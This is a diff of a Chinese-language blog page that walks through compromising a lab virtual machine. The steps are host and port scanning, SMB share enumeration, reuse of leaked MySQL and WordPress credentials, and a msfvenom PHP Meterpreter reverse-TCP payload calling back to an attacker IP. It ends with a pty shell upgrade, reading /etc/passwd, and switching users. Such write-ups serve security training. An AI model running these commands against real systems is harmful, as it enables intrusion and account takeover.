@@ -246,14 +246,14 @@ document.addEventListener('pjax:error', (e) => {
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209213315122.png" alt="image-20211209213315122"></p>
 <h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;可以使用arp-scan或者netdiscover</p>
 <h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209213356263.png" alt="image-20211209213356263"></p>
-<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209213701557.png" alt="image-20211209213701557"></p>
 <h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209214141466.png" alt="image-20211209214141466"></p>
 <p>&emsp;&emsp;可以看到开放了SMB、Mysql、SSH服务</p>
@@ -264,11 +264,11 @@ document.addEventListener('pjax:error', (e) => {
 <p>Share 是共享文件夹<br>IPC$ 是共享空连接，不需要用户名就能登陆的web服务器</p>
 </blockquote>
 <p>&emsp;&emsp;查看print里面的东西（没有权限）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\IP\print$&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\IP\print$&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209214941328.png" alt="image-20211209214941328"></p>
 <p>&emsp;&emsp;查看share共享文件夹里的东西</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\IP\share$&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\IP\share$&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215010614.png" alt="image-20211209215010614"></p>
 <p>&emsp;&emsp;get+文件名，可以下载获得文件信息</p>
@@ -280,20 +280,20 @@ document.addEventListener('pjax:error', (e) => {
 <p>&emsp;&emsp;接下来打开wordpress看看，主要看配置文件</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215530723.png" alt="image-20211209215530723"></p>
 <p>&emsp;&emsp;可以从前面看到该服务器开放了mysql 3306端口，尝试直接连接数据库，但是失败了，应该是设置了只能从本地连接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.1.107 -uroot -pTogieMYSQL12345^^</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.1.107 -uroot -pTogieMYSQL12345^^</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215826411.png" alt="image-20211209215826411"></p>
 <p>&emsp;&emsp;因为开放了22端口，尝试使用ssh协议远程登录，但显示密码不对</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh Admin@192.168.1.107</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh Admin@192.168.1.107</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209220036225.png" alt="image-20211209220036225"></p>
 <p>&emsp;&emsp;针对smb协议，查看是否存在远程溢出漏洞进行分析</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit samba版本号</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209220226503.png" alt="image-20211209220226503"></p>
 <p>&emsp;&emsp;没有任何漏洞可以利用</p>
 <h2 id="2、针对HTTP协议弱点探测"><a href="#2、针对HTTP协议弱点探测" class="headerlink" title="2、针对HTTP协议弱点探测"></a>2、针对HTTP协议弱点探测</h2><h3 id="（1）目录扫描"><a href="#（1）目录扫描" class="headerlink" title="（1）目录扫描"></a>（1）目录扫描</h3><p>&emsp;&emsp;发现wrodpress的wp-login.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.107</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.107</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209220716008.png" alt="image-20211209220716008"></p>
 <p>&emsp;&emsp;打开网页看看</p>
@@ -301,7 +301,7 @@ document.addEventListener('pjax:error', (e) => {
 <p>&emsp;&emsp;输入前面的wp-config.php中的账号和密码，成功进入</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209222113703.png" alt="image-20211209222113703"></p>
 <h3 id="（2）构造payload获取shell"><a href="#（2）构造payload获取shell" class="headerlink" title="（2）构造payload获取shell"></a>（2）构造payload获取shell</h3><p>&emsp;&emsp;使用msfvenom构造payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;打开msfconsole，开启监听</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209222737298.png" alt="image-20211209222737298"></p>
@@ -314,12 +314,12 @@ document.addEventListener('pjax:error', (e) => {
 <p>&emsp;&emsp;查看监听端，成功反弹shell</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209223633375.png" alt="image-20211209223633375"></p>
 <h3 id="（4）优化终端"><a href="#（4）优化终端" class="headerlink" title="（4）优化终端"></a>（4）优化终端</h3><p>&emsp;&emsp;调用交互式命令行，优化终端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
 
 <h3 id="（5）获得flag"><a href="#（5）获得flag" class="headerlink" title="（5）获得flag"></a>（5）获得flag</h3><p>&emsp;&emsp;使用<code>cat /etc/passwd</code>命令，来查看每个用户账号的属性。</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209223934049.png" alt="image-20211209223934049"></p>
 <p>&emsp;&emsp;可以看到里面有一个熟悉的，在wordpress页面中出现了很多次的用户togie，切换到其账户：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su togie</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su togie</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;密码是之前deets.txt中写的12345，成功进入</p>
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209224026734.png" alt="image-20211209224026734"></p>
